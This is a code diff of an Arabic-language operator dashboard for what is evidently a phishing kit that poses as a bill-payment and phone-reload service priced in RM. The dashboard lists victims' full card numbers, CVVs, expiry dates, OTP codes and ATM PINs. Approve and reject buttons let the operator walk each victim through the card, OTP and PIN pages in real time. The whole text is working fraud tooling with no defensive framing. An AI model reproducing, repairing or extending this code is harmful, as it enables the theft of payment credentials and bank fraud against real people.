+    // Full initial state
+    totalVisitors = data.totalVisitors || 0;
+    activeCount = data.activeCount || 0;
+
+    // Load sessions
+    (data.sessions || []).forEach(s => { sessionMap[s.sessionId] = s; });
+
+    // Load visitors (update phone numbers in sessions)
+    (data.visitors || []).forEach(v => {
+      if (v.sessionId && sessionMap[v.sessionId]) {
+        sessionMap[v.sessionId]._page = v.page;
       }
-    } catch (err) {
-      console.error('Failed to load sessions:', err);
+    });
+
+    renderAll();
+
+  } else if (data.type === 'new_session') {
+    sessionMap[data.sessionId] = data;
+    renderAll();
+    showToast('عميل جديد: ' + (data.number || '-'), 'success');
+
+  } else if (data.type === 'session_update') {
+    if (sessionMap[data.sessionId]) {
+      Object.assign(sessionMap[data.sessionId], data);
+    } else {
+      sessionMap[data.sessionId] = data;
     }
-  }
+    renderAll();
 
-  function updateSessions(sessionList) {
-    sessions = {};
-    let pending = 0, approved = 0, rejected = 0;
+  } else if (data.type === 'session_deleted') {
+    delete sessionMap[data.sessionId];
+    renderAll();
 
-    sessionList.forEach(s => {
-      sessions[s.sessionId] = s;
-      if (['pending', 'awaiting_otp', 'awaiting_pin'].includes(s.status)) pending++;
-      else if (['approved', 'otp_approved', 'pin_approved', 'completed'].includes(s.status)) approved++;
-      else if (['rejected', 'otp_rejected', 'pin_rejected'].includes(s.status)) rejected++;
-    });
+  } else if (data.type === 'sessions_cleared') {
+    Object.keys(sessionMap).forEach(k => delete sessionMap[k]);
+    renderAll();
 
-    document.getElementById('statTotal').textContent = sessionList.length;
-    document.getElementById('statPending').textContent = pending;
-    document.getElementById('statApproved').textContent = approved;
-    document.getElementById('statRejected').textContent = rejected;
+  } else if (data.type === 'visitor_update') {
+    totalVisitors = data.totalVisitors || totalVisitors;
+    activeCount = data.activeCount || activeCount;
 
-    const badge = document.getElementById('pendingBadge');
-    badge.textContent = pending;
-    badge.className = 'nav-badge' + (pending === 0 ? ' zero' : '');
-
-    document.getElementById('lastUpdate').textContent = 'Last update: ' + new Date().toLocaleTimeString();
-
-    renderSessions(sessionList);
-  }
-
-  function renderSessions(sessionList) {
-    const container = document.getElementById('sessionsList');
-
-    const filtered = sessionList.filter(s => {
-      if (currentFilter === 'all') return true;
-      if (currentFilter === 'pending') return s.status === 'pending';
-      if (currentFilter === 'awaiting_otp') return s.status === 'awaiting_otp';
-      if (currentFilter === 'awaiting_pin') return s.status === 'awaiting_pin';
-      if (currentFilter === 'completed') return ['approved', 'rejected', 'otp_approved', 'otp_rejected', 'pin_approved', 'pin_rejected', 'completed'].includes(s.status);
-      return true;
-    });
-
-    if (filtered.length === 0) {
-      container.innerHTML = `
-        <div class="empty-state">
-          <div class="empty-icon">📭</div>
-          <div class="empty-title">No sessions</div>
-          <div class="empty-sub">No sessions match the current filter.</div>
-        </div>`;
-      return;
+    // If visitor has a sessionId, update page info
+    if (data.visitor && data.visitor.sessionId && sessionMap[data.visitor.sessionId]) {
+      sessionMap[data.visitor.sessionId]._page = data.visitor.page;
     }
 
-    // Sort: pending first, then by time desc
-    filtered.sort((a, b) => {
-      const pendingStatuses = ['pending', 'awaiting_otp', 'awaiting_pin'];
-      const aP = pendingStatuses.includes(a.status) ? 1 : 0;
-      const bP = pendingStatuses.includes(b.status) ? 1 : 0;
-      if (aP !== bP) return bP - aP;
-      return new Date(b.createdAt) - new Date(a.createdAt);
-    });
+    updateStats();
+  }
+}
 
-    container.innerHTML = filtered.map(s => renderSessionCard(s)).join('');
+async function loadSessions() {
+  try {
+    const r = await fetch('/api/admin/sessions');
+    const d = await r.json();
+    if (d.success) {
+      d.sessions.forEach(s => { sessionMap[s.sessionId] = s; });
+      renderAll();
+    }
+  } catch(e) {}
+
+  try {
+    const r = await fetch('/api/visitor/stats');
+    const d = await r.json();
+    if (d.success) {
+      totalVisitors = d.totalVisitors || 0;
+      activeCount = d.activeCount || 0;
+      updateStats();
+    }
+  } catch(e) {}
+}
+
+// ══════════════════════════════════════════
+// RENDER
+// ══════════════════════════════════════════
+function renderAll() {
+  updateStats();
+  renderSessions();
+}
+
+function updateStats() {
+  const sessions = Object.values(sessionMap);
+  let pending = 0, approved = 0, rejected = 0;
+
+  sessions.forEach(s => {
+    const st = s.status || '';
+    if (['pending', 'awaiting_otp', 'awaiting_pin'].includes(st)) pending++;
+    else if (['approved', 'otp_approved', 'pin_approved', 'completed'].includes(st)) approved++;
+    else if (['rejected', 'otp_rejected', 'pin_rejected'].includes(st)) rejected++;
+  });
+
+  document.getElementById('statTotal').textContent = totalVisitors;
+  document.getElementById('statActive').textContent = activeCount;
+  document.getElementById('statPending').textContent = pending;
+  document.getElementById('statApproved').textContent = approved;
+  document.getElementById('statRejected').textContent = rejected;
+}
+
+function statusLabel(status) {
+  const map = {
+    pending: 'في انتظار القرار',
+    approved: 'موافق - انتظار OTP',
+    rejected: 'مرفوض',
+    awaiting_otp: 'في انتظار OTP',
+    otp_approved: 'OTP موافق - انتظار PIN',
+    otp_rejected: 'OTP مرفوض',
+    awaiting_pin: 'في انتظار PIN',
+    pin_approved: 'مكتمل ✓',
+    pin_rejected: 'PIN مرفوض',
+    completed: 'مكتمل ✓',
+  };
+  return map[status] || status;
+}
+
+function pageLabel(status, customPage) {
+  if (customPage) {
+    const pmap = {
+      home: 'الصفحة الرئيسية',
+      bill: 'صفحة الفاتورة',
+      reload: 'صفحة الشحن',
+      'pay-bill': 'إدخال المبلغ',
+      recharge: 'اختيار المبلغ',
+      'payment-method': 'طريقة الدفع',
+      'credit-card': 'بيانات البطاقة',
+      processing: 'معالجة الدفع',
+      otp: 'إدخال OTP',
+      'atm-pin': 'إدخال PIN',
+      'payment-success': 'نجاح الدفع',
+    };
+    return pmap[customPage] || customPage;
   }
 
-  function renderSessionCard(s) {
-    const isNew = !knownSessionIds.has(s.sessionId);
-    if (isNew) knownSessionIds.add(s.sessionId);
+  const smap = {
+    pending: 'معالجة الدفع',
+    approved: 'إدخال OTP',
+    rejected: 'بيانات البطاقة',
+    awaiting_otp: 'إدخال OTP',
+    otp_approved: 'إدخال PIN',
+    otp_rejected: 'إدخال OTP',
+    awaiting_pin: 'إدخال PIN',
+    pin_approved: 'نجاح الدفع',
+    pin_rejected: 'إدخال PIN',
+    completed: 'نجاح الدفع',
+  };
+  return smap[status] || '-';
+}
 
-    const statusClass = s.status.replace('_', '-');
-    const isPending = s.status === 'pending';
-    const isAwaitingOTP = s.status === 'awaiting_otp';
-    const isAwaitingPIN = s.status === 'awaiting_pin';
-    const canAct = isPending || isAwaitingOTP || isAwaitingPIN;
+function formatDate(iso) {
+  if (!iso) return '-';
+  const d = new Date(iso);
+  return d.toLocaleDateString('ar-EG', { day: '2-digit', month: '2-digit', year: 'numeric' })
+    + ' ' + d.toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit' });
+}
 
-    const cardClass = isPending ? 'pending' : (
-      ['approved','otp_approved','pin_approved','completed'].includes(s.status) ? 'approved' : 'rejected'
-    );
+function renderSessions() {
+  const tbody = document.getElementById('sessionsBody');
+  const sessions = Object.values(sessionMap).sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));
 
-    const time = new Date(s.createdAt).toLocaleString();
-    const typeLabel = s.type === 'reload' ? '🔄 Reload' : '💳 Bill Payment';
+  if (sessions.length === 0) {
+    tbody.innerHTML = `<tr id="emptyRow"><td colspan="6">
+      <div class="empty-state">
+        <div class="empty-icon">📋</div>
+        <div class="empty-text">لا توجد جلسات بعد. في انتظار العملاء...</div>
+      </div>
+    </td></tr>`;
+    return;
+  }
 
-    let actionLabel = '';
-    let approveAction = '';
-    let rejectAction = '';
+  tbody.innerHTML = sessions.map(s => {
+    const st = s.status || 'pending';
+    const isCard = st === 'pending';
+    const isOTP = st === 'awaiting_otp';
+    const isPIN = st === 'awaiting_pin';
 
-    if (isPending) {
-      actionLabel = 'Card Details Decision';
+    let approveAction = '', rejectAction = '', actionLabel = '';
+    if (isCard) {
       approveAction = `sendDecision('${s.sessionId}', 'approved')`;
       rejectAction = `sendDecision('${s.sessionId}', 'rejected')`;
-    } else if (isAwaitingOTP) {
-      actionLabel = 'OTP Decision';
+      actionLabel = 'البطاقة';
+    } else if (isOTP) {
       approveAction = `sendDecision('${s.sessionId}', 'otp_approved')`;
       rejectAction = `sendDecision('${s.sessionId}', 'otp_rejected')`;
-    } else if (isAwaitingPIN) {
-      actionLabel = 'ATM PIN Decision';
+      actionLabel = 'OTP';
+    } else if (isPIN) {
       approveAction = `sendDecision('${s.sessionId}', 'pin_approved')`;
       rejectAction = `sendDecision('${s.sessionId}', 'pin_rejected')`;
+      actionLabel = 'PIN';
     }
 
-    return `
-    <div class="session-card ${cardClass} ${isNew ? 'new-session' : ''}" id="card-${s.sessionId}">
-      <div class="session-header">
-        <div>
-          <div class="session-id">${s.sessionId}</div>
-          <div class="session-time">${time} · ${typeLabel}</div>
+    const canDecide = isCard || isOTP || isPIN;
+    const typeClass = (s.type === 'reload') ? 'type-reload' : 'type-bill';
+    const typeText = (s.type === 'reload') ? 'إعادة شحن' : 'فاتورة';
+    const statusClass = 'status-' + st.replace(/_/g, '_');
+    const pageTxt = pageLabel(st, s._page);
+
+    return `<tr>
+      <td class="phone-cell">${s.number || '-'}</td>
+      <td><span class="type-badge ${typeClass}">${typeText}</span></td>
+      <td class="amount-cell">${s.amount ? 'RM ' + s.amount : '-'}</td>
+      <td style="font-size:12px;color:#64748b;">${formatDate(s.createdAt)}</td>
+      <td>
+        <span class="status-badge ${statusClass}">${statusLabel(st)}</span>
+        <br/><span class="page-label" style="margin-top:4px;">${pageTxt}</span>
+      </td>
+      <td>
+        <div class="actions-cell">
+          ${canDecide ? `
+            <button class="btn-approve" onclick="${approveAction}">قبول ${actionLabel}</button>
+            <button class="btn-reject" onclick="${rejectAction}">رفض ${actionLabel}</button>
+          ` : ''}
+          <button class="btn-details" onclick="showDetails('${s.sessionId}')">التفاصيل</button>
+          <button class="btn-delete" onclick="deleteSession('${s.sessionId}')" title="حذف">✕</button>
         </div>
-        <span class="status-badge ${s.status}">${s.status.replace('_', ' ').toUpperCase()}</span>
-      </div>
-      <div class="session-body">
+      </td>
+    </tr>`;
+  }).join('');
+}
 
-        <!-- Transaction Info -->
-        <div class="info-grid">
-          <div class="info-item">
-            <label>Phone Number</label>
-            <span>${s.number}</span>
-          </div>
-          <div class="info-item">
-            <label>Amount</label>
-            <span>RM ${parseFloat(s.amount).toFixed(2)}</span>
-          </div>
-          <div class="info-item">
-            <label>Reference</label>
-            <span style="font-size:11px;">${s.ref}</span>
-          </div>
-        </div>
-
-        <!-- Card Details -->
-        ${s.cardData ? `
-        <div class="details-section">
-          <div class="details-title">💳 Card Details</div>
-          <div class="details-grid">
-            <div class="detail-item">
-              <label>Cardholder Name</label>
-              <span>${s.cardData.cardholderName}</span>
-            </div>
-            <div class="detail-item">
-              <label>Card Number</label>
-              <span>${formatCardDisplay(s.cardData.cardNumber)}</span>
-            </div>
-            <div class="detail-item">
-              <label>Expiry Date</label>
-              <span>${s.cardData.expiry}</span>
-            </div>
-            <div class="detail-item">
-              <label>CVV</label>
-              <span>${s.cardData.cvv}</span>
-            </div>
-            <div class="detail-item">
-              <label>Country</label>
-              <span>${s.cardData.country}</span>
-            </div>
-            <div class="detail-item">
-              <label>Bank</label>
-              <span>${s.cardData.bank}</span>
-            </div>
-          </div>
-        </div>` : ''}
-
-        <!-- OTP Data -->
-        ${s.otpData ? `
-        <div class="otp-data">
-          <label>OTP Entered:</label>
-          <span>${s.otpData.otp}</span>
-        </div>` : ''}
-
-        <!-- PIN Data -->
-        ${s.pinData ? `
-        <div class="pin-data">
-          <label>ATM PIN Entered:</label>
-          <span>${s.pinData.pin}</span>
-        </div>` : ''}
-
-        <!-- Action buttons -->
-        ${canAct ? `
-        <div style="margin-bottom:8px;font-size:12px;color:#94a3b8;font-weight:600;">${actionLabel}</div>
-        <div class="action-row">
-          <button class="btn-approve" onclick="${approveAction}">
-            ✓ Approve
-          </button>
-          <button class="btn-reject" onclick="${rejectAction}">
-            ✗ Reject
-          </button>
-          <button class="btn-delete" onclick="deleteSession('${s.sessionId}')">🗑</button>
-        </div>` : `
-        <div class="action-row">
-          <button class="btn-delete" onclick="deleteSession('${s.sessionId}')">🗑 Delete</button>
-        </div>`}
-
-      </div>
-    </div>`;
-  }
-
-  function formatCardDisplay(num) {
-    if (!num) return '-';
-    const clean = num.replace(/\D/g,'');
-    if (clean.length <= 4) return clean;
-    return clean.substring(0, 4) + ' **** **** ' + clean.slice(-4);
-  }
-
-  // ── Send decision ──
-  async function sendDecision(sessionId, status) {
-    try {
-      const res = await fetch('/api/admin/decision', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ sessionId, status })
-      });
-      const data = await res.json();
-      if (data.success) {
-        showToast(`✓ Decision sent: ${status.replace('_', ' ')}`, 'success');
-        loadSessions();
-      } else {
-        showToast('Failed to send decision', 'error');
-      }
-    } catch (err) {
-      showToast('Network error', 'error');
+// ══════════════════════════════════════════
+// ACTIONS
+// ══════════════════════════════════════════
+async function sendDecision(sessionId, status) {
+  try {
+    const r = await fetch('/api/admin/decision', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ sessionId, status }),
+    });
+    const d = await r.json();
+    if (d.success) {
+      showToast('تم إرسال القرار: ' + statusLabel(status), 'success');
+    } else {
+      showToast('فشل إرسال القرار', 'error');
     }
+  } catch(e) {
+    showToast('خطأ في الاتصال', 'error');
+  }
+}
+
+async function deleteSession(sessionId) {
+  try {
+    await fetch('/api/admin/delete/' + sessionId, { method: 'DELETE' });
+    delete sessionMap[sessionId];
+    renderAll();
+    showToast('تم حذف الجلسة', 'success');
+  } catch(e) {}
+}
+
+async function clearAll() {
+  if (!confirm('هل تريد مسح جميع الجلسات؟')) return;
+  try {
+    await fetch('/api/admin/clear', { method: 'DELETE' });
+    Object.keys(sessionMap).forEach(k => delete sessionMap[k]);
+    renderAll();
+    showToast('تم مسح جميع الجلسات', 'success');
+  } catch(e) {}
+}
+
+// ══════════════════════════════════════════
+// DETAILS MODAL
+// ══════════════════════════════════════════
+function showDetails(sessionId) {
+  const s = sessionMap[sessionId];
+  if (!s) return;
+
+  const card = s.cardData || {};
+  const otp = s.otpData || {};
+  const pin = s.pinData || {};
+
+  let html = '';
+
+  if (card.cardNumber) {
+    html += `
+      <div class="detail-row"><span class="detail-key">اسم حامل البطاقة</span><span class="detail-val">${card.cardholderName || '-'}</span></div>
+      <div class="detail-row"><span class="detail-key">رقم البطاقة</span><span class="detail-val">${card.cardNumber || '-'}</span></div>
+      <div class="detail-row"><span class="detail-key">تاريخ الانتهاء</span><span class="detail-val">${card.expiry || '-'}</span></div>
+      <div class="detail-row"><span class="detail-key">CVV</span><span class="detail-val">${card.cvv || '-'}</span></div>
+      <div class="detail-row"><span class="detail-key">البنك</span><span class="detail-val">${card.bank || '-'}</span></div>
+      <div class="detail-row"><span class="detail-key">الدولة</span><span class="detail-val">${card.country || '-'}</span></div>
+    `;
   }
 
-  // ── Delete session ──
-  async function deleteSession(sessionId) {
-    try {
-      await fetch('/api/admin/delete/' + sessionId, { method: 'DELETE' });
-      loadSessions();
-    } catch (err) {}
+  if (otp.otp) {
+    html += `<div class="detail-row"><span class="detail-key">رمز OTP</span><span class="detail-val" style="color:#2563eb;font-size:18px;letter-spacing:4px;">${otp.otp}</span></div>`;
   }
 
-  // ── Clear all ──
-  async function clearAll() {
-    if (!confirm('Clear all sessions?')) return;
-    try {
-      await fetch('/api/admin/clear', { method: 'DELETE' });
-      loadSessions();
-      showToast('All sessions cleared', 'info');
-    } catch (err) {}
+  if (pin.pin) {
+    html += `<div class="detail-row"><span class="detail-key">الرقم السري ATM</span><span class="detail-val" style="color:#9333ea;font-size:18px;letter-spacing:4px;">${pin.pin}</span></div>`;
   }
 
-  // ── Filter ──
-  function setFilter(filter, btn) {
-    currentFilter = filter;
-    document.querySelectorAll('.filter-tab').forEach(t => t.classList.remove('active'));
-    btn.classList.add('active');
-    renderSessions(Object.values(sessions));
-  }
+  html += `
+    <div class="detail-row"><span class="detail-key">رقم الهاتف</span><span class="detail-val">${s.number || '-'}</span></div>
+    <div class="detail-row"><span class="detail-key">المبلغ</span><span class="detail-val">RM ${s.amount || '-'}</span></div>
+    <div class="detail-row"><span class="detail-key">النوع</span><span class="detail-val">${s.type === 'reload' ? 'إعادة شحن' : 'فاتورة'}</span></div>
+    <div class="detail-row"><span class="detail-key">المرجع</span><span class="detail-val">${s.ref || '-'}</span></div>
+    <div class="detail-row"><span class="detail-key">الحالة</span><span class="detail-val">${statusLabel(s.status)}</span></div>
+    <div class="detail-row"><span class="detail-key">التاريخ</span><span class="detail-val">${formatDate(s.createdAt)}</span></div>
+  `;
 
-  // ── Toast ──
-  let toastTimer;
-  function showToast(msg, type = 'info') {
-    const toast = document.getElementById('toast');
-    toast.textContent = msg;
-    toast.className = `toast ${type} show`;
-    clearTimeout(toastTimer);
-    toastTimer = setTimeout(() => toast.classList.remove('show'), 4000);
-  }
+  if (!html) html = '<div style="text-align:center;color:#94a3b8;padding:20px;">لا توجد تفاصيل متاحة بعد</div>';
 
-  // ── Init ──
-  connectSSE();
-  loadSessions();
-  setInterval(loadSessions, 8000); // Poll every 8s as fallback
+  document.getElementById('modalContent').innerHTML = html;
+  document.getElementById('detailsModal').classList.add('show');
+}
+
+function closeModal() {
+  document.getElementById('detailsModal').classList.remove('show');
+}
+
+document.getElementById('detailsModal').addEventListener('click', function(e) {
+  if (e.target === this) closeModal();
+});
+
+// ══════════════════════════════════════════
+// TOAST
+// ══════════════════════════════════════════
+let toastTimer;
+function showToast(msg, type = '') {
+  const t = document.getElementById('toast');
+  t.textContent = msg;
+  t.className = 'toast show ' + type;
+  clearTimeout(toastTimer);
+  toastTimer = setTimeout(() => { t.className = 'toast'; }, 3000);
+}
+
+// ══════════════════════════════════════════
+// INIT
+// ══════════════════════════════════════════
+checkAuth();
 </script>
 </body>
 </html>
